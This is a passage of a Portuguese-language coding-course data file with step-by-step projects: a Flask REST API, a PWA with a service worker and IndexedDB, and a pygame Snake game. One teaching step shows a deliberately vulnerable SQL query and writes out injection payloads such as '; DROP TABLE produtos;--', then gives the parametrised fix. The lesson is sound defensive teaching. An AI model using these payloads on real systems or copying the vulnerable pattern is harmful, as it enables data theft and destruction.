            f'SELECT COUNT(*) FROM produtos {where}', params
        ).fetchone()[0]

        produtos = db.execute(
            f'SELECT * FROM produtos {where} LIMIT ? OFFSET ?',
            params + [limit, offset]
        ).fetchall()

    return jsonify({
        'data': [dict(p) for p in produtos],
        'meta': {
            'total': total,
            'page': page,
            'limit': limit,
            'pages': (total + limit - 1) // limit,
        }
    }), 200`,
        },
        checkpoint: 'GET /produtos?page=2&limit=10 retorna a pagina correta com metadados.',
      },
      {
        id: 'api-rest-4',
        order: 4,
        type: 'bug',
        title: 'SQL Injection via Query String',
        context:
          'Filtros dinamicos sao alvos classicos de SQL Injection. Concatenar strings para montar queries e um dos erros mais perigosos em desenvolvimento backend.',
        objective:
          'Identificar e corrigir SQL Injection em parametros de filtro da API.',
        concepts: ['SQL Injection', 'query parametrizada', 'whitelist', 'seguranca de API'],
        bugCode: {
          filename: 'rotas.py',
          language: 'python',
          code: `@app.get('/produtos')
def listar():
    categoria = request.args.get('categoria', '')
    ordem = request.args.get('ordem', 'nome')

    # VULNERAVEL: interpolacao direta de string na query
    sql = f"SELECT * FROM produtos WHERE categoria = '{categoria}' ORDER BY {ordem}"
    # ?categoria=' OR '1'='1    -> retorna tudo
    # ?categoria='; DROP TABLE produtos;-- -> apaga a tabela
    # ?ordem=nome; DROP TABLE produtos;-- -> ataque via ORDER BY
    produtos = db.execute(sql).fetchall()`,
        },
        bugDescription:
          "?categoria=' OR '1'='1 retorna todos os produtos ignorando a categoria. ?categoria='; DROP TABLE produtos;-- pode apagar todos os dados. ORDER BY tambem e vulneravel a injecao.",
        bugLesson:
          'Parametrize SEMPRE, mesmo em filtros opcionais. Para ORDER BY (que nao aceita parametro ? no SQLite), use uma whitelist de campos permitidos e valide antes de usar.',
        fixedCode: {
          filename: 'rotas.py',
          language: 'python',
          code: `CAMPOS_ORDENACAO_VALIDOS = {'nome', 'preco', 'categoria', 'criado_em'}

@app.get('/produtos')
def listar():
    categoria = request.args.get('categoria', '')
    ordem = request.args.get('ordem', 'nome')

    # Valida campo de ordenacao contra whitelist
    if ordem not in CAMPOS_ORDENACAO_VALIDOS:
        return jsonify({'erro': f'Ordenacao invalida. Use: {CAMPOS_ORDENACAO_VALIDOS}'}), 400

    params = []
    where = ''

    if categoria:
        where = 'WHERE categoria = ?'  # parametrizado
        params.append(categoria)

    # ORDER BY usa nome do campo validado (nunca entrada do usuario direta)
    sql = f'SELECT * FROM produtos {where} ORDER BY {ordem}'
    produtos = db.execute(sql, params).fetchall()
    return jsonify({'data': [dict(p) for p in produtos]})`,
        },
        checkpoint: 'Filtros e ordenacao nunca permitem SQL injection.',
      },
      {
        id: 'api-rest-5',
        order: 5,
        type: 'code',
        title: 'Rate Limiting',
        context:
          'Sem rate limiting, um unico cliente pode fazer milhares de requisicoes por segundo, derrubando o servidor ou executando ataques de forca bruta contra o endpoint de login.',
        objective:
          'Implementar rate limiting para proteger a API contra abuso e ataques de forca bruta.',
        concepts: ['rate limiting', '429 Too Many Requests', 'sliding window', 'flask-limiter', 'protecao contra DDoS'],
        code: {
          filename: 'rate_limit.py',
          language: 'python',
          code: `import time
from functools import wraps
from flask import request, jsonify

# Rate limiter simples em memoria (use Redis em producao)
_requisicoes = {}

def rate_limit(max_req=60, janela=60):
    """Decorator: max_req requisicoes por janela (segundos) por IP."""
    def decorador(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            ip = request.remote_addr
            agora = time.time()
            chave = f'{ip}:{func.__name__}'

            if chave not in _requisicoes:
                _requisicoes[chave] = []

            # Remove requisicoes fora da janela
            _requisicoes[chave] = [
                t for t in _requisicoes[chave] if agora - t < janela
            ]

            if len(_requisicoes[chave]) >= max_req:
                return jsonify({
                    'erro': 'Limite de requisicoes excedido. Tente novamente em breve.'
                }), 429  # Too Many Requests

            _requisicoes[chave].append(agora)
            return func(*args, **kwargs)
        return wrapper
    return decorador

# Uso:
# @app.post('/login')
# @rate_limit(max_req=5, janela=60)  # 5 tentativas por minuto
# def login(): ...`,
        },
        checkpoint: 'API retorna 429 apos exceder o limite de requisicoes.',
      },
      {
        id: 'api-rest-6',
        order: 6,
        type: 'architecture',
        title: 'Estrutura de API Profissional',
        context:
          'Uma API real nao e um arquivo unico com 500 linhas. Blueprints, middleware, tratamento global de erros e envelope de resposta padronizado tornam a API mantenivel e consistente.',
        objective:
          'Organizar a API com blueprints, middleware e tratamento global de erros.',
        concepts: ['blueprints Flask', 'middleware', 'error handlers', 'response envelope', 'separacao de responsabilidades'],
        code: {
          filename: 'estrutura.txt',
          language: 'bash',
          code: `# Estrutura de API Flask profissional
api/
  app.py              # factory function create_app()
  config.py           # Config, DevelopmentConfig, ProductionConfig
  extensions.py       # db, jwt, limiter (evita importacoes circulares)
  middleware.py        # autenticacao, logging, CORS

  v1/
    __init__.py        # blueprint v1 com url_prefix='/api/v1'
    produtos/
      routes.py        # endpoints de /produtos
      service.py       # regras de negocio
      repository.py    # queries SQL
    usuarios/
      routes.py
      service.py
      repository.py

  utils/
    responses.py       # envelope padrao: {data, meta, error}
    validators.py      # validacao de entrada reutilizavel

# Envelope padrao de resposta:
# {
#   "data": {...} ou [...],    <- resultado
#   "meta": {"total": 100},   <- paginacao/info extra
#   "error": null             <- null em sucesso, objeto em erro
# }

# Tratamento global de erros em app.py:
# @app.errorhandler(404) -> retorna JSON {error: "Not found"}
# @app.errorhandler(500) -> retorna JSON {error: "Internal error"}`,
        },
        checkpoint: 'API organizada, versionada, com tratamento global de erros e documentacao.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 12: Aplicativo PWA
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'aplicativo-pwa',
    title: 'Criando um Aplicativo (PWA)',
    subtitle: 'App que funciona no celular, instala na home e roda offline',
    description:
      'Construa um Progressive Web App completo: layout mobile-first, manifest para instalacao, Service Worker para cache offline, IndexedDB para dados locais e a sensacao real de um app nativo.',
    difficulty: 'intermediario',
    totalTime: '~6h',
    techStack: ['HTML', 'CSS', 'JavaScript', 'Service Worker', 'IndexedDB', 'Web App Manifest'],
    whatYoullLearn: [
      'Progressive Web App',
      'Service Worker',
      'cache offline',
      'IndexedDB',
      'instalacao na home screen',
      'notificacoes push basicas',
    ],
    steps: [
      {
        id: 'pwa-1',
        order: 1,
        type: 'code',
        title: 'A Base do App: HTML/CSS Mobile-First',
        context:
          'Um PWA precisa parecer um app nativo no celular. Mobile-first significa projetar para a tela menor primeiro e adicionar estilos para telas maiores, nao o contrario.',
        objective:
          'Criar a base HTML/CSS mobile-first de um gerenciador de tarefas com UX de app.',
        concepts: ['mobile-first', 'CSS variables', 'touch targets', 'viewport', 'bottom navigation'],
        code: {
          filename: 'index.html',
          language: 'html',
          code: `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#6366f1">
  <link rel="manifest" href="manifest.json">
  <title>Tarefas</title>
  <style>
    :root {
      --primaria: #6366f1;
      --fundo: #f8fafc;
      --card: #ffffff;
      --texto: #1e293b;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: system-ui, sans-serif;
      background: var(--fundo);
      color: var(--texto);
      max-width: 480px;
      margin: 0 auto;
    }
    header {
      background: var(--primaria);
      color: white;
      padding: 1rem;
      position: sticky; top: 0; z-index: 10;
    }
    .fab {
      position: fixed; bottom: 80px; right: 1rem;
      width: 56px; height: 56px;          /* touch target >= 44px */
      border-radius: 50%;
      background: var(--primaria); color: white;
      font-size: 1.5rem; border: none;
      box-shadow: 0 4px 12px rgba(99,102,241,0.4);
      cursor: pointer;
    }
    nav.bottom {
      position: fixed; bottom: 0; left: 0; right: 0;
      background: white;
      display: flex; justify-content: space-around;
      padding: 0.5rem 0; border-top: 1px solid #e2e8f0;
    }
    nav.bottom button {
      background: none; border: none;
      font-size: 0.75rem; color: #64748b;
      min-height: 44px; cursor: pointer;
      display: flex; flex-direction: column; align-items: center; gap: 2px;
    }
  </style>
</head>
<body>
  <header><h1>Minhas Tarefas</h1></header>
  <main id="lista" style="padding: 1rem 1rem 140px;"></main>
  <button class="fab" id="btn-nova">+</button>
  <nav class="bottom">
    <button>Todas</button>
    <button>Pendentes</button>
    <button>Concluidas</button>
  </nav>
  <script src="db.js"></script>
  <script src="app.js"></script>
</body>
</html>`,
        },
        checkpoint: 'App tem layout mobile-first e e usavel com os polegares.',
      },
      {
        id: 'pwa-2',
        order: 2,
        type: 'integration',
        title: 'Tornando Instalavel: Web App Manifest',
        context:
          'O manifest.json diz ao browser como o app deve se comportar quando instalado: nome, icones, cor de tema, modo de exibicao. Sem ele, o Chrome nao oferece a opcao "Adicionar a tela inicial".',
        objective:
          'Criar o manifest.json completo para tornar o PWA instalavel.',
        concepts: ['Web App Manifest', 'display standalone', 'icons PWA', 'theme-color', 'installability'],
        code: {
          filename: 'manifest.json',
          language: 'javascript',
          code: `{
  "name": "Gerenciador de Tarefas",
  "short_name": "Tarefas",
  "description": "Gerencie suas tarefas offline com este PWA.",
  "start_url": "/",
  "display": "standalone",
  "orientation": "portrait",
  "background_color": "#f8fafc",
  "theme_color": "#6366f1",
  "lang": "pt-BR",
  "icons": [
    {
      "src": "icons/icon-192.png",
      "sizes": "192x192",
      "type": "image/png",
      "purpose": "maskable any"
    },
    {
      "src": "icons/icon-512.png",
      "sizes": "512x512",
      "type": "image/png",
      "purpose": "maskable any"
    }
  ],
  "shortcuts": [
    {
      "name": "Nova Tarefa",
      "url": "/?action=nova",
      "description": "Criar uma nova tarefa"
    }
  ]
}`,
        },
        checkpoint: 'Ao acessar pelo Chrome mobile, aparece opcao Adicionar a tela inicial.',
      },
      {
        id: 'pwa-3',
        order: 3,
        type: 'bug',
        title: 'App Nao Funciona Sem Internet',
        context:
          'Um app que para de funcionar sem internet nao e um PWA de verdade. O Service Worker e o que diferencia um PWA de um site comum: ele intercepta as requisicoes de rede e serve conteudo cacheado.',
        objective:
          'Identificar a ausencia de fallback offline e implementar um Service Worker basico.',
        concepts: ['Service Worker', 'cache-first', 'network-first', 'offline fallback', 'fetch event'],
        bugCode: {
          filename: 'app.js',
          language: 'javascript',
          code: `// SEM Service Worker: requisicoes vao direto para a rede
async function carregarTarefas() {
  // Se offline: TypeError: Failed to fetch
  // Resultado: tela branca, nenhuma informacao para o usuario
  const res = await fetch('/api/tarefas');
  const dados = await res.json();
  renderizarTarefas(dados);
}`,
        },
        bugDescription:
          'Sem internet: tela branca. O usuario perde todos os dados que estava vendo e nao tem nenhum feedback do motivo.',
        bugLesson:
          'Service Workers interceptam requests de rede e servem conteudo cacheado quando offline. Registre o SW no HTML e implemente as estrategias: cache-first para assets estaticos, network-first para dados.',
        fixedCode: {
          filename: 'app.js',
          language: 'javascript',
          code: `// Registra o Service Worker
if ('serviceWorker' in navigator) {
  navigator.serviceWorker
    .register('/sw.js')
    .then(() => console.log('SW registrado'))
    .catch(err => console.error('SW falhou:', err));
}

// Com SW, fetch funciona offline pois SW serve o cache
async function carregarTarefas() {
  try {
    const res = await fetch('/api/tarefas');
    const dados = await res.json();
    renderizarTarefas(dados);
  } catch (err) {
    // Fallback para IndexedDB quando offline
    const dados = await db.getTasks();
    renderizarTarefas(dados);
    mostrarBanner('Voce esta offline. Exibindo dados locais.');
  }
}`,
        },
        checkpoint: 'App carrega normalmente mesmo sem internet (conteudo cacheado).',
      },
      {
        id: 'pwa-4',
        order: 4,
        type: 'code',
        title: 'Service Worker: Cache e Offline',
        context:
          'O Service Worker e um JavaScript que roda em background, separado da pagina. Ele tem tres eventos principais: install (cachear assets), activate (limpar caches antigos) e fetch (interceptar requisicoes).',
        objective:
          'Implementar um Service Worker completo com versionamento de cache e estrategias cache-first e network-first.',
        concepts: ['install event', 'activate event', 'fetch event', 'cache versioning', 'cache strategies'],
        code: {
          filename: 'sw.js',
          language: 'javascript',
          code: `const CACHE_NOME = 'tarefas-v1';
const ASSETS = ['/', '/index.html', '/app.js', '/db.js', '/manifest.json', '/offline.html'];

// Instala: cacheia todos os assets estaticos
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NOME).then(cache => cache.addAll(ASSETS))
  );
  self.skipWaiting();
});

// Ativa: remove caches de versoes antigas
self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then(nomes =>
      Promise.all(
        nomes.filter(n => n !== CACHE_NOME).map(n => caches.delete(n))
      )
    )
  );
  self.clients.claim();
});

// Fetch: cache-first para assets, network-first para API
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);

  if (url.pathname.startsWith('/api/')) {
    // Network-first para dados dinamicos
    event.respondWith(
      fetch(event.request)
        .catch(() => caches.match('/offline.html'))
    );
  } else {
    // Cache-first para assets estaticos
    event.respondWith(
      caches.match(event.request)
        .then(cached => cached || fetch(event.request))
        .catch(() => caches.match('/offline.html'))
    );
  }
});`,
        },
        checkpoint: 'Service Worker intercepta requests e serve cache corretamente.',
      },
      {
        id: 'pwa-5',
        order: 5,
        type: 'integration',
        title: 'Dados Offline com IndexedDB',
        context:
          'localStorage e simples mas limitado (apenas strings, ~5MB). IndexedDB e um banco de dados real no browser: suporta objetos, indices, transacoes e varios MB de dados.',
        objective:
          'Criar uma camada de abstacao sobre IndexedDB para armazenar tarefas offline.',
        concepts: ['IndexedDB', 'object store', 'transacao', 'cursor', 'offline-first'],
        code: {
          filename: 'db.js',
          language: 'javascript',
          code: `const DB_NOME = 'TarefasDB';
const DB_VERSAO = 1;

function abrirDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(DB_NOME, DB_VERSAO);
    req.onupgradeneeded = (e) => {
      const db = e.target.result;
      if (!db.objectStoreNames.contains('tarefas')) {
        const store = db.createObjectStore('tarefas', { keyPath: 'id', autoIncrement: true });
        store.createIndex('concluida', 'concluida', { unique: false });
      }
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function addTarefa(tarefa) {
  const db = await abrirDB();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tarefas', 'readwrite');
    const req = tx.objectStore('tarefas').add({
      ...tarefa,
      criada_em: Date.now(),
      concluida: false,
    });
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function getTarefas() {
  const db = await abrirDB();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tarefas', 'readonly');
    const req = tx.objectStore('tarefas').getAll();
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function deleteTarefa(id) {
  const db = await abrirDB();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tarefas', 'readwrite');
    const req = tx.objectStore('tarefas').delete(id);
    req.onsuccess = () => resolve();
    req.onerror = () => reject(req.error);
  });
}`,
        },
        checkpoint: 'Tarefas criadas offline sao salvas e aparecem ao reabrir o app.',
      },
      {
        id: 'pwa-6',
        order: 6,
        type: 'architecture',
        title: 'Estrutura Completa do PWA',
        context:
          'Um PWA precisa passar no checklist do Lighthouse para ser considerado completo. Vamos revisar todos os requisitos e a estrutura final do projeto.',
        objective:
          'Verificar o checklist de PWA e entender a estrutura completa do projeto.',
        concepts: ['Lighthouse PWA audit', 'HTTPS', 'installability', 'offline', 'performance'],
        code: {
          filename: 'estrutura.txt',
          language: 'bash',
          code: `# Estrutura completa do PWA
tarefas-pwa/
  index.html       # app shell com meta viewport e link manifest
  manifest.json    # nome, icones, cores, display standalone
  sw.js            # Service Worker: cache e offline
  app.js           # logica do app + registro do SW
  db.js            # wrapper IndexedDB
  offline.html     # pagina exibida quando sem cache e sem internet
  icons/
    icon-192.png
    icon-512.png

# Checklist PWA (Lighthouse):
# [x] Servido em HTTPS (Vercel/Netlify fazem isso automaticamente)
# [x] Tem manifest.json com name, icons, start_url, display
# [x] Service Worker registrado e funcional
# [x] Pagina de fallback offline (offline.html)
# [x] Instalavel (ícone aparece na barra do Chrome)
# [x] Carrega rapido (assets cacheados)
# [x] Responsivo (meta viewport configurado)
# [x] Dados persistidos (IndexedDB)

# Para testar:
# 1. DevTools > Application > Service Workers
# 2. DevTools > Application > Manifest
# 3. DevTools > Lighthouse > Progressive Web App`,
        },
        checkpoint: 'PWA completo: instalavel, funciona offline e salva dados localmente.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 13: Jogo Simples
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'jogo-simples',
    title: 'Criando um Jogo Simples',
    subtitle: 'Snake game do zero: logica, loop, colisao e pontuacao',
    description:
      'Construa o jogo Snake do zero com Python e pygame, aprendendo os fundamentos do desenvolvimento de jogos: game loop, deteccao de colisao, gerenciamento de estado e sistema de pontuacao com recorde persistente.',
    difficulty: 'intermediario',
    totalTime: '~4h',
    techStack: ['Python', 'pygame'],
    whatYoullLearn: [
      'game loop',
      'delta time',
      'deteccao de colisao',
      'gerenciamento de estado',
      'sprites e movimento',
      'sistema de pontuacao',
    ],
    steps: [
      {
        id: 'jogo-1',
        order: 1,
        type: 'code',
        title: 'O Game Loop',
        context:
          'O game loop e o coracao de qualquer jogo: um loop que roda dezenas de vezes por segundo, processando inputs, atualizando o estado do jogo e redesenhando a tela. Sem ele, o jogo congela.',
        objective:
          'Criar a estrutura basica do jogo com janela, game loop e controle de FPS.',
        concepts: ['game loop', 'FPS', 'event handling', 'pygame.Clock', 'separacao de update e draw'],
        code: {
          filename: 'game_loop.py',
          language: 'python',
          code: `import pygame
import sys

# Configuracoes
LARGURA, ALTURA = 600, 600
FPS = 10  # Snake e lento por design
CELL_SIZE = 20
COR_FUNDO = (15, 15, 15)
COR_GRADE = (30, 30, 30)

def desenhar_grade(tela):
    for x in range(0, LARGURA, CELL_SIZE):
        pygame.draw.line(tela, COR_GRADE, (x, 0), (x, ALTURA))
    for y in range(0, ALTURA, CELL_SIZE):
        pygame.draw.line(tela, COR_GRADE, (0, y), (LARGURA, y))

def main():
    pygame.init()
    tela = pygame.display.set_mode((LARGURA, ALTURA))
    pygame.display.set_caption('Snake')
    clock = pygame.time.Clock()

    rodando = True
    while rodando:
        # 1. PROCESSAR EVENTOS (input)
        for evento in pygame.event.get():
            if evento.type == pygame.QUIT:
                rodando = False
            if evento.type == pygame.KEYDOWN:
                if evento.key == pygame.K_ESCAPE:
                    rodando = False

        # 2. ATUALIZAR ESTADO (logica do jogo)
        # (cobra, colisoes, pontuacao - implementar nos proximos passos)

        # 3. DESENHAR (render)
        tela.fill(COR_FUNDO)
        desenhar_grade(tela)
        pygame.display.flip()

        # 4. CONTROLAR VELOCIDADE
        clock.tick(FPS)

    pygame.quit()
    sys.exit()

if __name__ == '__main__':
    main()`,
        },
        checkpoint: 'Janela abre, fecha ao pressionar X ou ESC, roda a 10 FPS.',
      },
      {
        id: 'jogo-2',
        order: 2,
        type: 'code',
        title: 'A Cobra: Movimento e Direcao',
        context:
          'A cobra no Snake e uma lista de segmentos. A cada tick, um novo segmento e adicionado na frente (nova posicao da cabeca) e o ultimo e removido do rabo — criando a ilusao de movimento.',
        objective:
          'Implementar a classe Snake com lista de segmentos, direcao e movimento continuo.',
        concepts: ['lista como estrutura de dados', 'vetor de direcao', 'movimento em grid', 'classe Python', 'Snake mechanics'],
        code: {
          filename: 'snake.py',
          language: 'python',
          code: `import pygame
from game_loop import CELL_SIZE, LARGURA, ALTURA

COR_COBRA = (74, 222, 128)      # verde
COR_CABECA = (134, 239, 172)    # verde claro

class Snake:
    def __init__(self):
        # Cobra comeca no centro com 3 segmentos
        cx = (LARGURA // CELL_SIZE // 2) * CELL_SIZE
        cy = (ALTURA // CELL_SIZE // 2) * CELL_SIZE
        self.body = [
            (cx, cy),                      # cabeca
            (cx - CELL_SIZE, cy),          # segmento 2
            (cx - 2 * CELL_SIZE, cy),      # rabo
        ]
        self.direcao = (CELL_SIZE, 0)      # movendo para direita
        self.crescer = False

    @property
    def cabeca(self):
        return self.body[0]

    def mudar_direcao(self, nova_dir):
        # Nao pode inverter 180 graus
        oposto = (-self.direcao[0], -self.direcao[1])
        if nova_dir != oposto:
            self.direcao = nova_dir

    def mover(self):
        nova_cabeca = (
            self.cabeca[0] + self.direcao[0],
            self.cabeca[1] + self.direcao[1],
        )
        self.body.insert(0, nova_cabeca)
        if self.crescer:
            self.crescer = False   # nao remove rabo: cobra cresceu
        else:
            self.body.pop()        # remove rabo: mantém tamanho

    def grow(self):
        self.crescer = True

    def draw(self, tela):
        for i, seg in enumerate(self.body):
            cor = COR_CABECA if i == 0 else COR_COBRA
            pygame.draw.rect(tela, cor,
                pygame.Rect(seg[0], seg[1], CELL_SIZE - 1, CELL_SIZE - 1))`,
        },
        checkpoint: 'Cobra se move continuamente na direcao atual.',
      },
      {
        id: 'jogo-3',
        order: 3,
        type: 'bug',
        title: 'Colisao que Nao Detecta',
        context:
          'Deteccao de colisao parece simples mas tem armadilhas classicas: comparar posicoes em ponto flutuante, usar o operador errado na verificacao de fronteiras, ou esquecer de converter para coordenadas de grade.',
        objective:
          'Identificar e corrigir erros na deteccao de colisao da cobra com paredes e consigo mesma.',
        concepts: ['colisao em grid', 'coordenadas inteiras', 'boundary check', 'self-collision', 'off-by-one error'],
        bugCode: {
          filename: 'colisao.py',
          language: 'python',
          code: `def verificar_colisao(cobra, comida):
    # BUG 1: compara float com tupla (nunca igual)
    if cobra.cabeca == comida.pos:   # pode falhar com floats
        cobra.grow()

def fora_dos_limites(cabeca):
    x, y = cabeca
    # BUG 2: >= deveria ser > (ou usar LARGURA - CELL_SIZE)
    # cobra morre um passo antes de sair da tela
    if x < 0 or x >= LARGURA - CELL_SIZE:
        return True
    if y < 0 or y >= ALTURA - CELL_SIZE:
        return True
    return False

def colisao_propria(cobra):
    # BUG 3: checa cabeca contra body[0] (a propria cabeca)
    # nunca detecta self-collision pois cabeca == body[0]
    return cobra.cabeca in cobra.body  # deveria ser body[1:]`,
        },
        bugDescription:
          'A cobra passa pela comida sem comer. A cobra morre um quadrado antes de chegar na parede. A cobra nunca morre ao colidir consigo mesma.',
        bugLesson:
          'Colisao em grid: use inteiros para todas as posicoes (nao float). Verifique os limites com >= LARGURA (nao LARGURA - CELL_SIZE). Self-collision: compare cabeca contra body[1:] (excluindo a propria cabeca).',
        fixedCode: {
          filename: 'colisao.py',
          language: 'python',
          code: `from game_loop import LARGURA, ALTURA, CELL_SIZE

def verificar_colisao_comida(cobra, comida):
    # Posicoes ja sao inteiros multiplos de CELL_SIZE
    if cobra.cabeca == comida.pos:
        cobra.grow()
        return True
    return False

def fora_dos_limites(cabeca):
    x, y = cabeca
    # CORRETO: cobra morre ao sair da area jogavel
    return x < 0 or x >= LARGURA or y < 0 or y >= ALTURA

def colisao_propria(cobra):
    # CORRETO: exclui a cabeca (body[0]) da verificacao
    return cobra.cabeca in cobra.body[1:]

def checar_morte(cobra):
    return fora_dos_limites(cobra.cabeca) or colisao_propria(cobra)`,
        },
        checkpoint: 'Cobra come a comida e morre ao bater na parede ou em si mesma.',
      },
      {
        id: 'jogo-4',
        order: 4,
        type: 'integration',
        title: 'Comida, Pontuacao e Velocidade Progressiva',
        context:
          'Com a logica basica da cobra funcionando, e hora de adicionar os elementos que tornam o jogo desafiador: comida que aparece aleatoriamente, pontuacao e velocidade que aumenta com o progresso.',
        objective:
          'Integrar comida, pontuacao exibida na tela e velocidade progressiva ao jogo.',
        concepts: ['random choice', 'font rendering pygame', 'game state', 'velocidade progressiva', 'spawn de comida'],
        code: {
          filename: 'game.py',
          language: 'python',
          code: `import pygame, sys, random
from snake import Snake
from game_loop import LARGURA, ALTURA, CELL_SIZE, COR_FUNDO, desenhar_grade
from colisao import checar_morte

COR_COMIDA = (248, 113, 113)
FPS_BASE = 8
FPS_MAX = 20

def todas_celulas():
    return [(x, y)
            for x in range(0, LARGURA, CELL_SIZE)
            for y in range(0, ALTURA, CELL_SIZE)]

def spawnar_comida(cobra):
    celulas_livres = [c for c in todas_celulas() if c not in cobra.body]
    return random.choice(celulas_livres)

def main():
    pygame.init()
    tela = pygame.display.set_mode((LARGURA, ALTURA))
    pygame.display.set_caption('Snake')
    fonte = pygame.font.SysFont('monospace', 20, bold=True)
    clock = pygame.time.Clock()

    cobra = Snake()
    comida = spawnar_comida(cobra)
    pontos = 0

    rodando = True
    while rodando:
        fps = min(FPS_BASE + pontos // 5, FPS_MAX)  # +1 FPS a cada 5 pontos

        for ev in pygame.event.get():
            if ev.type == pygame.QUIT:
                rodando = False
            if ev.type == pygame.KEYDOWN:
                mapa = {pygame.K_UP: (0, -CELL_SIZE), pygame.K_DOWN: (0, CELL_SIZE),
                        pygame.K_LEFT: (-CELL_SIZE, 0), pygame.K_RIGHT: (CELL_SIZE, 0)}
                if ev.key in mapa:
                    cobra.mudar_direcao(mapa[ev.key])

        cobra.mover()

        if checar_morte(cobra):
            break  # vai para tela de game over (proximo passo)

        if cobra.cabeca == comida:
            cobra.grow()
            pontos += 1
            comida = spawnar_comida(cobra)

        tela.fill(COR_FUNDO)
        desenhar_grade(tela)
        pygame.draw.rect(tela, COR_COMIDA,
            pygame.Rect(comida[0], comida[1], CELL_SIZE-1, CELL_SIZE-1))
        cobra.draw(tela)
        txt = fonte.render(f'Pontos: {pontos}  FPS: {fps}', True, (255,255,255))
        tela.blit(txt, (10, 10))
        pygame.display.flip()
        clock.tick(fps)

    pygame.quit()
    sys.exit()

if __name__ == '__main__':
    main()`,
        },
        checkpoint: 'Jogo fica mais rapido a cada 5 pontos. Pontuacao e exibida na tela.',
      },
      {
        id: 'jogo-5',
        order: 5,
        type: 'bug',
        title: 'Comida Aparece Dentro da Cobra',
        context:
          'Spawnar comida com random.randint sem verificar a posicao da cobra pode colocar a comida em cima de um segmento — impossivel de alcançar e frustrante para o jogador.',
        objective:
          'Corrigir o spawn de comida para garantir que apareca apenas em celulas vazias.',
        concepts: ['list comprehension', 'set intersection', 'spawn seguro', 'logica de jogo'],
        bugCode: {
          filename: 'game.py',
          language: 'python',
          code: `import random
from game_loop import LARGURA, ALTURA, CELL_SIZE

def spawnar_comida_bug(cobra):
    # BUG: nao verifica se a celula esta ocupada pela cobra
    x = random.randint(0, (LARGURA // CELL_SIZE) - 1) * CELL_SIZE
    y = random.randint(0, (ALTURA // CELL_SIZE) - 1) * CELL_SIZE
    return (x, y)
# Com cobra grande, a maioria das celulas esta ocupada
# e a comida frequentemente aparece dentro da cobra`,
        },
        bugDescription:
          'A comida aparece debaixo de um segmento da cobra. Com cobra grande, acontece frequentemente — jogo fica impossivel de completar.',
        bugLesson:
          'Gere a lista de celulas livres (todas as celulas menos as ocupadas pela cobra) e escolha uma aleatoriamente. Se nao houver celulas livres, o jogador ganhou!',
        fixedCode: {
          filename: 'game.py',
          language: 'python',
          code: `import random
from game_loop import LARGURA, ALTURA, CELL_SIZE

def todas_celulas():
    return [(x, y)
            for x in range(0, LARGURA, CELL_SIZE)
            for y in range(0, ALTURA, CELL_SIZE)]

def spawnar_comida(cobra):
    # Apenas celulas nao ocupadas pela cobra
    corpo_set = set(cobra.body)  # lookup O(1) em vez de O(n)
    celulas_livres = [c for c in todas_celulas() if c not in corpo_set]

    if not celulas_livres:
        return None  # cobra preencheu toda a tela: vitoria!

    return random.choice(celulas_livres)`,
        },
        checkpoint: 'Comida sempre aparece em celula vazia.',
      },
      {
        id: 'jogo-6',
        order: 6,
        type: 'architecture',
        title: 'Adicionando Tela de Game Over e Recorde',
        context:
          'Um jogo profissional tem estados: menu inicial, jogando, game over, pausado. Gerenciar estados com um enum evita ifs espalhados e torna facil adicionar novos estados.',
        objective:
          'Adicionar maquina de estados, tela de game over e recorde persistente entre sessoes.',
        concepts: ['maquina de estados', 'enum Python', 'persistencia com JSON', 'game states', 'UX de jogo'],
        code: {
          filename: 'states.py',
          language: 'python',
          code: `import pygame, json, os
from enum import Enum, auto

class Estado(Enum):
    JOGANDO = auto()
    GAME_OVER = auto()

ARQUIVO_RECORDE = 'recorde.json'

def carregar_recorde():
    if os.path.exists(ARQUIVO_RECORDE):
        try:
            with open(ARQUIVO_RECORDE) as f:
                return json.load(f).get('recorde', 0)
        except Exception:
            pass
    return 0

def salvar_recorde(pontos):
    recorde = max(pontos, carregar_recorde())
    with open(ARQUIVO_RECORDE, 'w') as f:
        json.dump({'recorde': recorde}, f)
    return recorde

def tela_game_over(tela, pontos, recorde):
    fonte_grande = pygame.font.SysFont('monospace', 48, bold=True)
    fonte_media = pygame.font.SysFont('monospace', 24)
    fonte_pequena = pygame.font.SysFont('monospace', 18)

    overlay = pygame.Surface(tela.get_size(), pygame.SRCALPHA)
    overlay.fill((0, 0, 0, 180))
    tela.blit(overlay, (0, 0))

    cx, cy = tela.get_width() // 2, tela.get_height() // 2

    def centrar(surf, y):
        tela.blit(surf, (cx - surf.get_width() // 2, y))

    centrar(fonte_grande.render('GAME OVER', True, (248, 113, 113)), cy - 80)
    centrar(fonte_media.render(f'Pontos: {pontos}', True, (255, 255, 255)), cy - 10)
    centrar(fonte_media.render(f'Recorde: {recorde}', True, (251, 191, 36)), cy + 30)
    centrar(fonte_pequena.render('Pressione ENTER para jogar novamente', True, (148, 163, 184)), cy + 80)

    pygame.display.flip()`,
        },
        checkpoint: 'Jogo tem tela de game over com pontuacao e recorde. Recorde persiste entre sessoes.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 14: Bot Discord
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'bot-discord',
    title: 'Criando um Bot Automatizado (Discord)',
    subtitle: 'Bot real com comandos, automacao e integracao com APIs',
    description:
      'Crie um bot Discord real com comandos de prefixo e slash commands, integracao com APIs externas, tarefas agendadas e organizacao profissional com Cogs.',
    difficulty: 'intermediario',
    totalTime: '~5h',
